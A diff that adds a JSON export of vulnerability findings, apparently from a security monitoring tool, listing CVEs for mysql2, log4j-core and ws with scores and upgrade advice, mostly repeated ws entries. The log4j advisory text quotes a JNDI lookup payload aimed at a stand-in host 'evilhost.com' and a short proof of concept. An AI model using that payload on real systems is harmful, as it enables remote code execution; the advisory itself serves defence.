@@ -1,0 +1,2202 @@
+[
+    {
+      "vulnerability.id": "10227890708189245372",
+      "affected_entity.id": "PROCESS_GROUP-DDAFDFB12541C926",
+      "vulnerability.display_id": "S-1244",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 8.8,
+      "vulnerability.cvss.base_score": 9.8,
+      "vulnerability.references.cve": [
+        "CVE-2024-21511"
+      ],
+      "vulnerability.remediation.description": "Upgrade `mysql2` to version 3.9.7 or higher.",
+      "vulnerability.title": "Arbitrary Code Injection",
+      "vulnerability.type": "Code Injection",
+      "vulnerability.description": "[mysql2](https://www.npmjs.com/package/mysql2) is a mostly API compatible with mysqljs and supports majority of features.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection due to improper sanitization of the `timezone` parameter in the `readCodeFor` function by calling a native MySQL Server date/time function.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-299FF2EDD49BEE36",
+      "affected_entity.vulnerable_component.name": "mysql2:2.3.3",
+      "vulnerability.references.cwe": [
+        "CWE-94"
+      ],
+      "vulnerability.parent.davis_assessment.score": 8.8,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10489033029364122206",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-556",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 9,
+      "vulnerability.references.cve": [
+        "CVE-2021-45046"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.16.0 or higher.",
+      "vulnerability.title": "Remote Code Execution (RCE)",
+      "vulnerability.type": "Code Injection",
+      "vulnerability.description": "[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) if one of the following conditions is met:\r\n\r\n1. Logging configuration explicitly enables lookups – either by default (if using a version lower than 2.15.0) or manually by using `%m{lookups}` as `formatMsgNoLookups` is switched on by default as of version 2.15.0.\r\n2. Or uses a non-default Pattern Layout with Context Lookup where attackers can control input data via Thread Context Map (MDC),\r\n3. Or uses `Logger.printf(\"%s\", userInput)` function where attackers can control the userInput variable.\r\n\r\nA malicious actor is able to bypass the mitigation implemented in version 2.15.0 that limits JNDI lookups to localhost only: `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`.\r\n\r\nWe recommend updating to version 2.16.0 which completely disables JNDI lookups by default. If upgrading is not an option, this issue can be mitigated in prior releases by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\r\n\r\n### PoC\r\n\r\nIn config:\r\n```\r\n<pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>\r\n```\r\n\r\nIn code:\r\n```java\r\nThreadContext.put(\"loginId\", UserControlledInput);\r\n```\r\n\r\n### History\r\n\r\nThis vulnerability was previously assigned a CVSS score of 3.7 (Low), and the impact was believed to be Denial of Service (DoS).\r\n\r\nFurthermore, the advisory previously mentioned Thread Context Map patterns (%X, %mdc, or %MDC) as being vulnerable to this issue, but that has since been proven wrong.\r\n\r\nOn December 17, 2021 new information came to light, demonstrating that an Arbitrary Code Execution vulnerability still exists in version 2.15.0 of Log4j due to a bypass to the localhost-only lookup mechanism.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.logging.log4j:log4j-core:2.4",
+      "vulnerability.references.cwe": [
+        "CWE-94"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-16C1BC2B82E7B29B",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E198ABCC1B2E376C",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-A9197D4D850CFDB0",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-408204AC24A891F7",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E4561BB525218EEB",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-A0D14C85AEE468AC",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-ED45332136B22668",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E40E068DCBD63372",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-C5DC6850840BB918",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-8C2188489BE97EB8",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-7705246EEC28C0E3",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-1385D62E5A081B61",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-54567CEDED2347AB",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-04CABB0377608E72",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-283DEA70223CF60D",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-77892626993B47CB",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-DE4E27515FEBBCCC",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-3A321F0C9FEBC935",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-802A069D81FAE069",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-085E02C3557D7D04",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-EB6A6AC2BD9ABBB4",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
